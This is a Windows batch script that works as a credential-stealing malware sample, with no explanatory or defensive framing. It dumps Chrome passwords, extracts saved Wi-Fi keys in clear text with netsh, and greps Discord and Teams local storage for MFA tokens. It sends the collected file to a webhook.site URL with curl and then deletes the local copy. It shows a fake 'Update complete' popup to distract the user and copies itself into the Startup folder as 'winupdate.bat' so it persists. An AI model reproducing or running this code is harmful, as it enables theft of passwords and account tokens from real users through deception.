@echo off
setlocal EnableDelayedExpansion

:: Log location
set LOGS=logs
if not exist "%LOGS%" mkdir "%LOGS%"
set OUTFILE=%LOGS%\creds_live.txt

:: Chrome credentials (requires real chrome_password.exe)
echo [Chrome Credentials] >> %OUTFILE%
chrome_password.exe >> %OUTFILE% 2>&1

:: Wi-Fi credentials
echo. >> %OUTFILE%
echo [WiFi Credentials] >> %OUTFILE%
for /f "tokens=*" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    for /f "tokens=4 delims=:" %%a in ("%%i") do (
        set profile=%%a
        call :trim "!profile!"
        echo SSID: !profile! >> %OUTFILE%
        netsh wlan show profile name="!profile!" key=clear | findstr "Key Content" >> %OUTFILE%
        echo. >> %OUTFILE%
    )
)

:: Token harvesting
echo [Tokens - Discord/Teams/Outlook] >> %OUTFILE%
for %%F in ("%APPDATA%\discord\Local Storage\leveldb", "%APPDATA%\Microsoft\Teams\Local Storage\leveldb") do (
    if exist %%F (
        echo Searching in: %%F >> %OUTFILE%
        findstr /S /R /C:"["]?mfa\.[a-zA-Z0-9-_]{84}["]?" %%F\*.ldb >> %OUTFILE% 2>nul
        echo. >> %OUTFILE%
    )
)

:: Webhook exfil
curl -X POST -H "Content-Type: text/plain" --data-binary "@%OUTFILE%" https://webhook.site/0af65e5c-8d75-4975-9c99-8f899e593199

:: Cleanup
del %OUTFILE%

:: Distraction GUI
mshta "javascript:alert('Update complete. No action needed.');close();"

:: Persistence
copy /Y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.bat"

exit /b

:trim
set "result=%~1"
:loop
if not "%result:~0,1%"==" " goto done
set "result=%result:~1%"
goto loop
:done
set profile=%result%
exit /b
